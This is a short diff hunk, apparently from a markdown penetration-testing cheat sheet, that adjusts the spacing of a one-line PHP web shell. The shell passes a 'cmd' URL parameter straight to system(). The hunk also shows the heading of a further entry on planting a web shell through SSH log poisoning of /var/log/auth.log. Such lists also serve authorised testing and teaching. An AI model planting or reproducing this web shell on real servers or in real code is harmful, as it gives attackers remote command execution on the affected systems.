@@ -13,7 +13,7 @@
 `PHP Web Shell`
 
   ```php
-  <?php system($_GET['cmd']);?>
+  <?php system($_GET['cmd']); ?>
   ```
   
 `Web Shell (SSH Log Poisoning) -> /var/log/auth.log`
